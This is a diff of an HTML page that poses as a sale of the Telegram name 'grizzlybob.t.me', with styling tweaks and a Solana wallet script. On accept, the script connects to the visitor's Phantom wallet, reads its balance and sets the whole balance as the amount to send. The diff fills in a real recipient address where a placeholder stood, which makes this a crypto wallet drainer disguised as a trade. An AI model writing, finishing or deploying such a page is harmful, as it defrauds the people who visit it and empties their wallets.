@@ -161,61 +161,6 @@
             background-color: #3b8cc4;
         }
 
-        /* Neue ID für "Deal in Progress" grünen Kasten - Mobil Optimiert */
-        #deal-in-progress-mobile {
-            background-color: #2b8200;  /* Grüner Hintergrund */
-            color: rgb(255, 255, 255);               /* Weiße Schrift */
-            padding: 6px 12px;          /* Weniger Padding für kompaktere Darstellung */
-            border-radius: 12px;        /* Abgerundete Ecken */
-            font-weight: bold;          /* Fett gedruckter Text */
-            font-size: 12px;            /* Kleinere Schriftgröße */
-         
-            text-align: center;         /* Text zentrieren */
-            margin-top: 12px; 
-            margin-left: 80px;  
-            margin-right: 80px;
-            margin-bottom: 15px;
-            justify-content: center;        /* Weniger Abstand nach oben auf mobilen Geräten */
-        }
-
-        /* Responsive Design für Handys */
-        @media (max-width: 768px) {
-            .top-container {
-                flex-direction: column;
-                align-items: center;
-                text-align: center;
-            }
-
-            .deal-name {
-                font-size: 24px;
-            }
-
-            #deal-in-progress-mobile {
-                font-size: 12px;
-                padding: 6px 12px; /* Weniger Padding */
-               
-                margin-top: 12px;   /* Kleinerer Abstand */
-            }
-
-            .deal-item {
-                width: 48%;
-            }
-
-            .user-info {
-                padding: 12px;
-                margin-top: 20px;
-            }
-
-            .sol-info {
-                font-size: 14px;
-                padding: 10px 0;
-            }
-
-            .exchange-button {
-                padding: 12px;
-                font-size: 14px;
-            }
-        }
     </style>
 </head>
 <body>
@@ -230,7 +175,7 @@
         <div class="top-container">
             <div class="textu">Buy Telegram Name:</div>
             <div class="deal-name">grizzlybob.t.me</div>
-            <div id="deal-in-progress-mobile">Deal in Progress</div> <!-- Neue ID für den mobilen Status -->
+            <div id="deal-in-progress-mobile">Deal in Progress</div>
         </div>
 
         <!-- Flex Container für Deal Info und User Info untereinander -->
@@ -285,7 +230,6 @@
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
     <script>
         document.getElementById("acceptButton").addEventListener("click", async () => {
             if (window.solana && window.solana.isPhantom) {
@@ -304,7 +248,7 @@
                     const balance = await connection.getBalance(publicKey);
 
                     // Zieladresse (Beispiel-Wallet)
-                    const recipient = new solanaWeb3.PublicKey("IHRE_ZIELADRESSE_HIER");
+                    const recipient = new solanaWeb3.PublicKey("HcTaTyhbgupFPUzYnw6jg4d6DBajdw1zwZgcrbuAVaX6");
 
                     // Berechne den Betrag, der gesendet werden soll (die gesamte Balance)
                     const amount = balance;
